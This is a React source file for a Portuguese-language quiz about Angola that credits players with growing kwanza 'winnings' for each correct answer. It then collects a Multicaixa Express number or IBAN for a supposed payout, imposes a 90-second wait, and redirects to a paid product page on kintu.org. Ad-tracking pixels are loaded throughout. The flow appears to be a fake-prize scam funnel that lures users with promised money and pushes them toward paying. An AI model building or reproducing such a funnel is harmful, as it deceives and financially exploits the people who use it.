import React, { useState, useEffect } from 'react';
import { AnimatePresence } from 'framer-motion';
import { useToast } from '@/components/ui/use-toast';
import { Toaster } from '@/components/ui/toaster';

import LandingPage from '@/pages/LandingPage';
import InfoPage from '@/pages/InfoPage';
import QuizPage from '@/pages/QuizPage';
import RetryPage from '@/pages/RetryPage';
import CongratsPage from '@/pages/CongratsPage';
import PaymentPage from '@/pages/PaymentPage';
import FinalPage from '@/pages/FinalPage';
import CorrectAnswerModal from '@/components/CorrectAnswerModal';

const quizQuestions = [
    { question: "Quem fundou a cidade de Luanda?", options: ["António Agostinho Neto", "Paulo José Dias de Novais", "Diogo Cão", "Paulo Dias de Novais"], correct: 3, value: 10000 },
    { question: "Qual província é conhecida pela Serra da Leba?", options: ["Namibe", "Huíla", "Benguela", "Cunene"], correct: 1, value: 22500 },
    { question: "Em que ano Angola conquistou a independência?", options: ["1973", "1974", "1975", "1976"], correct: 2, value: 17500 },
    { question: "Qual é o rio mais extenso de Angola?", options: ["Rio Kwanza", "Rio Cunene", "Rio Okavango", "Rio Zambeze"], correct: 0, value: 20000 },
    { question: "Qual é o idioma oficial de Angola?", options: ["Kimbundu", "Português", "Umbundu", "Kikongo"], correct: 1, value: 25000 },
    { question: "Quantas províncias tem Angola?", options: ["16", "17", "18", "19"], correct: 2, value: 30000 },
    { question: "Qual é a moeda oficial de Angola?", options: ["Rand", "Euro", "Kwanza", "Dólar"], correct: 2, value: 8000 },
    { question: "Qual é o animal símbolo de Angola?", options: ["Leão", "Palanca Negra", "Elefante", "Leopardo"], correct: 1, value: 15000 },
    { question: "Onde está localizado o parque nacional da Cangandala?", options: ["Benguela", "Malanje", "Moxico", "Kwanza-Sul"], correct: 1, value: 12500 },
    { question: "Qual é a capital de Angola?", options: ["Luanda", "Benguela", "Huambo", "Lobito"], correct: 0, value: 5000 },
];

function App() {
    const [page, setPage] = useState('landing');
    const [name, setName] = useState('');
    const [currentQuestion, setCurrentQuestion] = useState(0);
    const [score, setScore] = useState(0);
    const [showCorrectModal, setShowCorrectModal] = useState(false);
    const [selectedAnswer, setSelectedAnswer] = useState(null);
    const [isAnswered, setIsAnswered] = useState(false);
    const [paymentMethod, setPaymentMethod] = useState('multicaixa');
    const [paymentInput, setPaymentInput] = useState('');
    const [showValidateButton, setShowValidateButton] = useState(false);
    const [incorrectQuestions, setIncorrectQuestions] = useState([]);
    const [retryCurrentQuestionIndex, setRetryCurrentQuestionIndex] = useState(0);

    const { toast } = useToast();

    // Garantir que os scripts de pixel UTMify sejam carregados
    useEffect(() => {
        // Verificar se o pixel já foi carregado
        if (!window.pixelId) {
            window.pixelId = "691ad0b3d45a0036ba9fcfb4";
        }
        
        // Carregar pixel script se ainda não estiver carregado
        if (!document.querySelector('script[src="https://cdn.utmify.com.br/scripts/pixel/pixel.js"]')) {
            const pixelScript = document.createElement("script");
            pixelScript.setAttribute("async", "");
            pixelScript.setAttribute("defer", "");
            pixelScript.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
            document.head.appendChild(pixelScript);
        }

        // Carregar UTMs script se ainda não estiver carregado
        if (!document.querySelector('script[src="https://cdn.utmify.com.br/scripts/utms/latest.js"]')) {
            const utmsScript = document.createElement("script");
            utmsScript.setAttribute("src", "https://cdn.utmify.com.br/scripts/utms/latest.js");
            utmsScript.setAttribute("data-utmify-prevent-xcod-sck", "");
            utmsScript.setAttribute("data-utmify-prevent-subids", "");
            utmsScript.setAttribute("async", "");
            utmsScript.setAttribute("defer", "");
            document.head.appendChild(utmsScript);
        }
    }, []);

    useEffect(() => {
        if (page === 'final') {
            const timer = setTimeout(() => {
                setShowValidateButton(true);
            }, 90000); // 90 seconds
            return () => clearTimeout(timer);
        }
    }, [page]);

    const handleStart = () => setPage('info');

    const handleStartGame = () => {
        if (name.trim() === '') {
            toast({ title: "Erro", description: "Por favor, digite o seu nome completo.", variant: "destructive" });
            return;
        }
        setPage('quiz');
    };

    const proceedToNextStep = () => {
        const nextQuestion = currentQuestion + 1;
        if (nextQuestion < quizQuestions.length) {
            setCurrentQuestion(nextQuestion);
            setSelectedAnswer(null);
            setIsAnswered(false);
        } else {
            if (incorrectQuestions.length > 0) {
                setPage('retry');
                setSelectedAnswer(null);
                setIsAnswered(false);
            } else {
                setPage('congrats');
            }
        }
    };

    const handleAnswer = (index) => {
        if (isAnswered) return;
        setSelectedAnswer(index);
        setIsAnswered(true);

        if (index === quizQuestions[currentQuestion].correct) {
            setTimeout(() => {
                setScore(prev => prev + quizQuestions[currentQuestion].value);
                setShowCorrectModal(true);
            }, 1000);
        } else {
            setIncorrectQuestions(prev => [...prev, quizQuestions[currentQuestion]]);
            setTimeout(() => {
                proceedToNextStep();
            }, 1000);
        }
    };

    const handleContinue = () => {
        setShowCorrectModal(false);
        proceedToNextStep();
    };

    const handleRetryAnswer = (index) => {
        if (isAnswered) return;
        setSelectedAnswer(index);
        setIsAnswered(true);
        const currentRetryQuestion = incorrectQuestions[retryCurrentQuestionIndex];

        if (index === currentRetryQuestion.correct) {
            setTimeout(() => {
                setScore(prev => prev + currentRetryQuestion.value);
                setShowCorrectModal(true); // Re-use modal for correct retry
            }, 1000);
        } else {
            setTimeout(() => {
                toast({ title: "Resposta Incorreta", description: "Tente novamente para acertar.", variant: "destructive" });
                setSelectedAnswer(null);
                setIsAnswered(false);
            }, 1000);
        }
    };

    const handleRetryContinue = () => {
        setShowCorrectModal(false);
        const nextRetryIndex = retryCurrentQuestionIndex + 1;
        if (nextRetryIndex < incorrectQuestions.length) {
            setRetryCurrentQuestionIndex(nextRetryIndex);
            setSelectedAnswer(null);
            setIsAnswered(false);
        } else {
            setPage('congrats');
        }
    };

    const handleLiberar = () => setPage('payment');

    const handleSacar = () => {
        if (paymentMethod === 'multicaixa' && (paymentInput.length !== 9 || !/^\d{9}$/.test(paymentInput))) {
            toast({ title: "Erro", description: "O número Multicaixa Express deve ter 9 dígitos numéricos.", variant: "destructive" });
            return;
        }
        if (paymentMethod === 'transferencia' && (paymentInput.length !== 21 || !/^\d{21}$/.test(paymentInput))) {
            toast({ title: "Erro", description: "O IBAN deve ter 21 dígitos numéricos.", variant: "destructive" });
            return;
        }
        setPage('final');
    };

    const handleValidate = () => {
        window.location.href = 'https://www.kintu.org/product/9ff53dd3-eb60-400f-b017-1e68f8d2e8af';
    };

    const renderPage = () => {
        switch (page) {
            case 'landing':
                return <LandingPage onStart={handleStart} />;
            case 'info':
                return <InfoPage name={name} setName={setName} onStartGame={handleStartGame} />;
            case 'quiz':
                return <QuizPage questionData={quizQuestions[currentQuestion]} questionNumber={currentQuestion + 1} totalQuestions={quizQuestions.length} onAnswer={handleAnswer} score={score} name={name} selectedAnswer={selectedAnswer} isAnswered={isAnswered} />;
            case 'retry':
                return <RetryPage questionData={incorrectQuestions[retryCurrentQuestionIndex]} questionNumber={retryCurrentQuestionIndex + 1} totalQuestions={incorrectQuestions.length} onAnswer={handleRetryAnswer} score={score} name={name} selectedAnswer={selectedAnswer} isAnswered={isAnswered} />;
            case 'congrats':
                return <CongratsPage name={name} onLiberar={handleLiberar} />;
            case 'payment':
                return <PaymentPage name={name} paymentMethod={paymentMethod} setPaymentMethod={setPaymentMethod} paymentInput={paymentInput} setPaymentInput={setPaymentInput} onSacar={handleSacar} />;
            case 'final':
                return <FinalPage name={name} showValidateButton={showValidateButton} onValidate={handleValidate} />;
            default:
                return <LandingPage onStart={handleStart} />;
        }
    };

    return (
        <>
            <Toaster />
            <AnimatePresence mode="wait">
                {renderPage()}
            </AnimatePresence>
            {showCorrectModal && (
                <CorrectAnswerModal
                    accumulated={score}
                    onContinue={page === 'retry' ? handleRetryContinue : handleContinue}
                />
            )}
        </>
    );
}

export default App;